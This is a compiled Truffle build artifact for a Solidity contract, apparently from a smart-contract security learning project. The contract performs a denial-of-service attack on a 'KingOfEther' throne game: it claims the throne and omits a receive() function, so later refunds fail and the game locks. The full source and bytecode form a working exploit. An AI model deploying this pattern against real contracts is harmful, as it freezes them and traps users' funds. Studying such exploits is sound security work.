{
  "contractName": "KingOfEtherAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_kingOfEther",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "kingOfEther",
      "outputs": [
        {
          "internalType": "contract KingOfEther",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052604051610213380380610213833981016040819052610022916100a2565b600080546001600160a01b0383166001600160a01b031991821681178355600180549092163317909155604080516369deb7b760e01b8152905191926369deb7b7923492600480820193929182900301818588803b15801561008357600080fd5b505af1158015610097573d6000803e3d6000fd5b5050505050506100d2565b6000602082840312156100b457600080fd5b81516001600160a01b03811681146100cb57600080fd5b9392505050565b610132806100e16000396000f3fe60806040526004361060305760003560e01c806348eb76ee14603557806388fcf0b314606f5780639e5faafc14608d575b600080fd5b348015604057600080fd5b506001546053906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015607a57600080fd5b506000546053906001600160a01b031681565b60936095565b005b60008054906101000a90046001600160a01b03166001600160a01b03166369deb7b7346040518263ffffffff1660e01b81526004016000604051808303818588803b15801560e257600080fd5b505af115801560f5573d6000803e3d6000fd5b505050505056fea26469706673582212209206e5b3d28db517326942b93d318e9eee26562851d26f3a6a6976af46f5673664736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./KingOfEther.sol\";\n\n/**\n * KingOfEtherAttack - DoS 攻击合约\n * \n * 攻击原理：\n * 成为国王后，让合约没有 receive() 函数\n * 这样当新的挑战者想要成为国王时，向这个合约转账会失败\n * 导致 KingOfEther 合约卡死\n */\ncontract KingOfEtherAttack {\n    KingOfEther public kingOfEther;\n    address public attacker;\n    \n    /**\n     * 构造函数 - 成为国王\n     */\n    constructor(address _kingOfEther) payable {\n        kingOfEther = KingOfEther(_kingOfEther);\n        attacker = msg.sender;\n        \n        // 直接存入 ETH 成为国王\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n    \n    /**\n     * 注意：没有 receive() 函数！\n     * 这样当向这个合约转账时会失败\n     */\n    \n    /**\n     * attack - 尝试再次攻击（可选，用于增加锁定金额）\n     */\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\KingOfEtherAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.728Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "attack()": {
        "notice": "attack - 尝试再次攻击（可选，用于增加锁定金额）"
      },
      "constructor": {
        "notice": "构造函数 - 成为国王"
      }
    },
    "notice": "KingOfEtherAttack - DoS 攻击合约  攻击原理： 成为国王后，让合约没有 receive() 函数 这样当新的挑战者想要成为国王时，向这个合约转账会失败 导致 KingOfEther 合约卡死",
    "version": 1
  }
}